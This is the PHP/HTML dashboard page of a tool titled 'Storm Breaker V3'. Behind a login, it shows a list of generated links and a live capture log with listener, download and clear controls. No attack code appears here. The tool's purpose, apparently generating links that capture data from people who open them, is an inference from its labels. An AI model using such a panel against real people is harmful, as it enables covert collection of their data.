<?php
session_start();
include "./assets/components/login-arc.php";

require_login();
refresh_remember_me_cookie();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <link href="./assets/css/app.css" rel="stylesheet">
    <title>Storm Breaker - V3</title>

</head>


<body id="ourbody" onload="check_new_version()">

<div class="topbar">
    <div class="topbar-brand">
        <span>&#127786;&#65039;</span> Storm Breaker
        <span class="badge-version">v3</span>
    </div>
    <a class="topbar-logout" href="logout.php">Logout</a>
</div>

<div class="panel-container">

    <div class="card mb-4">
        <div class="card-header">
            <h2>Generated Links</h2>
        </div>
        <div class="card-body">
            <div id="links"></div>
        </div>
    </div>

    <div class="card">
        <div class="card-header">
            <h2>Live Capture Log</h2>
            <div class="card-toolbar">
                <button class="btn btn-danger btn-sm" id="btn-listen">Listener Running / press to stop</button>
                <button class="btn btn-outline btn-sm" id="btn-download" onclick=saveTextAsFile(result.value,'log.txt')>Download</button>
                <button class="btn btn-outline btn-sm" id="btn-clear">Clear</button>
            </div>
        </div>
        <div class="card-body">
            <textarea class="form-control w-100" placeholder="result ..." id="result" rows="15"></textarea>
        </div>
    </div>

</div>


</body>
</html>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>
